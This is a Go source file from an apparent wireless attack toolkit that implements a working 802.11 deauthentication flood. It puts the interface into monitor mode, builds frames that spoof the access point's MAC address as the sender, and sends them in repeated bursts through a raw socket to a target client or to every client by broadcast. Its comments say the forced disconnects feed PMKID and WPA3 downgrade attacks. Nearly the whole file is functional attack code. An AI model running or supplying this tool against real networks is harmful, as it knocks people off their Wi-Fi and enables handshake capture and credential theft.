//go:build linux

// Package wireless — 802.11 deauthentication.
//
// Deauth is a management frame (type 0x0C subtype 0x00, combined 0xC0).
// A client accepts a deauth from the AP, and the AP accepts a deauth from
// the client — neither side authenticates the transmitter, so a spoofed
// src MAC suffices. Reason code 7 ("class 3 frame received from
// nonassociated STA") drops the client immediately and often forces a
// re-handshake, which is what PMKID and WPA3 downgrade attacks feed on.
//
// Frames go out through an AF_PACKET SOCK_RAW socket bound to the monitor
// iface. Radiotap header here is the minimal 8-byte version 0 (present
// flags = 0), which every mac80211 driver accepts for TX.
package wireless

import (
	"context"
	"encoding/binary"
	"fmt"
	"net"
	"syscall"
	"time"
)

// DeauthOptions controls a deauth flood.
type DeauthOptions struct {
	Iface     string        // monitor-mode iface
	BSSID     string        // AP MAC (spoofed as source)
	Client    string        // target client MAC, or "ff:ff:ff:ff:ff:ff" for broadcast
	Reason    uint16        // 802.11 reason code; 7 is the classic
	Interval  time.Duration // delay between bursts; 0 = as fast as possible
	Burst     int           // frames per interval; 1 is enough, 3-5 improves odds
	Duration  time.Duration // total run; 0 = until ctx done
}

// ParseMAC is a thin wrapper so the caller gets a clear error.
func ParseMAC(s string) (net.HardwareAddr, error) {
	hw, err := net.ParseMAC(s)
	if err != nil {
		return nil, fmt.Errorf("wireless: bad MAC %q: %w", s, err)
	}
	if len(hw) != 6 {
		return nil, fmt.Errorf("wireless: MAC %q is not 6 bytes", s)
	}
	return hw, nil
}

// Deauth sends deauthentication frames until ctx is done or Duration
// elapses. It owns its own TX socket — capture (33) uses its own RX socket,
// and the kernel delivers the two independently.
func Deauth(ctx context.Context, opts DeauthOptions) error {
	if opts.Iface == "" {
		return fmt.Errorf("wireless: iface required")
	}
	bssid, err := ParseMAC(opts.BSSID)
	if err != nil {
		return err
	}
	client := []byte{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
	if opts.Client != "" {
		client, err = ParseMAC(opts.Client)
		if err != nil {
			return err
		}
	}
	if opts.Reason == 0 {
		opts.Reason = 7
	}
	if opts.Burst <= 0 {
		opts.Burst = 3
	}

	if !isMonitorMode(opts.Iface) {
		if err := enableMonitor(opts.Iface); err != nil {
			return fmt.Errorf("wireless: enable monitor: %w", err)
		}
	}

	ifi, err := net.InterfaceByName(opts.Iface)
	if err != nil {
		return fmt.Errorf("wireless: iface lookup: %w", err)
	}

	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(0x0003)))
	if err != nil {
		return fmt.Errorf("wireless: socket: %w", err)
	}
	defer syscall.Close(fd)

	// Bind for TX — a SockaddrLinklayer with no Halen/Alen set tells the
	// kernel "I'll supply the full frame including 802.11 header".
	sll := &syscall.SockaddrLinklayer{
		Protocol: htons(0x0003),
		Ifindex:  ifi.Index,
	}
	if err := syscall.Bind(fd, sll); err != nil {
		return fmt.Errorf("wireless: bind: %w", err)
	}

	frame := buildDeauth(bssid, client, opts.Reason)

	var tick <-chan time.Time
	if opts.Interval > 0 {
		t := time.NewTicker(opts.Interval)
		defer t.Stop()
		tick = t.C
	}

	var deadline <-chan time.Time
	if opts.Duration > 0 {
		deadline = time.After(opts.Duration)
	}

	sent := 0
	for {
		select {
		case <-ctx.Done():
			return nil
		case <-deadline:
			return nil
		default:
		}

		for i := 0; i < opts.Burst; i++ {
			if err := syscall.Sendto(fd, frame, 0, sll); err != nil {
				if err == syscall.ENOBUFS || err == syscall.EAGAIN {
					time.Sleep(2 * time.Millisecond)
					continue
				}
				return fmt.Errorf("wireless: sendto: %w", err)
			}
			sent++
		}

		if tick != nil {
			select {
			case <-tick:
			case <-ctx.Done():
				return nil
			case <-deadline:
				return nil
			}
		} else {
			// small yield so we don't starve the scheduler
			time.Sleep(500 * time.Microsecond)
		}
	}
}

// buildDeauth returns a radiotap + deauth frame ready for sendto.
//
// Layout:
//   radiotap (8 bytes)  : version 0, pad 0, len=8, present=0
//   802.11 mgmt header  : fc=0x00C0, dur=0, addr1=client (dst),
//                         addr2=bssid (src, spoofed), addr3=bssid (bssid)
//   reason code (2)     : little-endian
func buildDeauth(bssid, client []byte, reason uint16) []byte {
	// radiotap
	rt := make([]byte, 8)
	rt[0] = 0x00 // version
	rt[1] = 0x00 // pad
	binary.LittleEndian.PutUint16(rt[2:4], 8)   // header length
	binary.LittleEndian.PutUint32(rt[4:8], 0)   // present flags: none

	// mgmt frame
	mf := make([]byte, 24+2)
	mf[0] = 0xC0 // frame control: version 0, type mgmt (0), subtype deauth (0xC)
	mf[1] = 0x00 // flags: not to DS, not from DS
	// duration left zero
	copy(mf[4:10], client)  // addr1 (receiver)
	copy(mf[10:16], bssid)  // addr2 (transmitter, spoofed)
	copy(mf[16:22], bssid)  // addr3 (BSSID)
	// seq ctrl (22:24) left zero
	binary.LittleEndian.PutUint16(mf[24:26], reason)

	out := make([]byte, 0, len(rt)+len(mf))
	out = append(out, rt...)
	out = append(out, mf...)
	return out
}
